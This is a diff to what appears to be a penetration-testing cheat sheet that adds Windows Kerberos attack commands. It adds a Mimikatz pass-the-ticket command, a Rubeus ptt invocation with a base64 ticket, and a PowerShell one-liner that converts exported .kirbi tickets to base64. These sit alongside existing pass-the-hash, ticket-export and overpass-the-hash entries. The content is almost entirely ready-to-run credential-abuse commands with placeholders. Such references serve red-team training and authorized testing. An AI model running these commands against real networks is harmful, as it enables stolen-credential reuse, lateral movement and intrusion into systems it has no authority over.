@@ -678,6 +678,7 @@ $ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
 ```
 C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export"
 C:\> dir *.kirb
+mimikatz # kerberos::ptt "<ticket.kirbi>"
 ```
 
 - Rubeus Pass-The-Ticket (PTT)
@@ -687,6 +688,14 @@ C:\> Rubeus.exe dump /nowrap
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<hash> /ptt
 OR
 C:\> Rubeus.exe ptt /ticket:<ticket.kirbi>
+OR
+C:\> Rubeus.exe ptt /ticket:<base64_ticket>
+```
+
+- Convert .kirbi to Base64 Format
+
+```
+PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket.kirbi>"))
 ```
 
 - Mimikatz OverPass-The-Hash (OPTH)
